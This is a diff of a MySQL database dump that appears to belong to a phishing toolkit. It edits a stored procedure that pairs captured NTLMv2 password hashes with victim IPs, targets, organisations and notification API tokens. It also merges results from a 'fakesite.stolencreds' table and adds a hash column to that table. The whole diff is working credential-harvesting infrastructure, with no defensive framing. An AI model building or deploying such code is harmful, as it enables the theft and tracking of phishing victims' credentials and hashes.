@@ -156,11 +156,15 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `MatchHashes`(IN InIP VARCHAR(100), IN InHash VARCHAR(1000))
 BEGIN
-UPDATE requests SET NTLMv2 = CONCAT_WS(InHash, InHash) WHERE IP = InIP;
-SELECT DISTINCT rq.Target,rq.Org,nt.API_Token,nt.Channel,rq.UUID FROM requests rq 
+UPDATE requests SET NTLMv2 = CONCAT_WS(NTLMv2, InHash) WHERE IP = InIP;
+UPDATE fakesite.stolencreds sc SET sc.Hash = CONCAT_WS(sc.Hash, InHash) WHERE sc.ip = InIP;
+
+SELECT DISTINCT 'PhishingDocs' as Title, rq.Target,rq.Org,nt.API_Token,nt.Channel,rq.UUID FROM requests rq 
 INNER JOIN Notifications nt on nt.UUID = rq.UUID
 WHERE rq.IP = InIP
-ORDER BY nt.Datetime DESC
+UNION
+SELECT 'FakeSite' as Title, sc.location as Target, '' as Org, '' as API_Token, '' as Channel, '' as UUID
+FROM fakesite.stolencreds sc WHERE sc.ip = InIP
 LIMIT 1;
 END ;;
 DELIMITER ;
@@ -190,7 +194,8 @@ CREATE TABLE `stolencreds` (
   `entered` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   `ip` varchar(50) DEFAULT NULL,
   `location` varchar(50) DEFAULT NULL,
-  `Token` varchar(1000) DEFAULT NULL
+  `Token` varchar(1000) DEFAULT NULL,
+  `Hash` varchar(1000) DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
@@ -259,4 +264,4 @@ DELIMITER ;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2018-09-18 15:27:03
+-- Dump completed on 2018-09-25 13:01:14
